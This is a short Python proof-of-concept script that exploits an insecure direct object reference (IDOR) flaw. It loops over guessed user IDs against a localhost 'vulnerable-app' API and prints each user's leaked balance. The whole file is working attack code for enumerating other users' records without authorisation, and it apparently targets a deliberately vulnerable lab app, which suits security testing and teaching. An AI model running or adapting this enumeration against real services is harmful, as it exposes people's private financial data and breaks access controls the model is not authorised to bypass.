import requests

BASE_URL = "http://localhost:3000/api"

def exploit_idor():
    print("[+] Starting IDOR Proof of Concept...")

    # Target user IDs to iterate through
    user_ids = ["user_1", "user_2", "user_3"]

    for user_id in user_ids:
        url = f"{BASE_URL}/balance/{user_id}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                print(f"[!] Successfully leaked data for {user_id}: Balance = {data.get('balance')}")
            elif response.status_code == 404:
                print(f"[-] User {user_id} not found.")
            else:
                print(f"[-] Failed to fetch data for {user_id}. Status: {response.status_code}")
        except requests.exceptions.ConnectionError:
            print("[X] Error: Could not connect to the server. Is the vulnerable-app running on port 3000?")
            return

    print("[+] IDOR PoC finished.")

if __name__ == "__main__":
    exploit_idor()
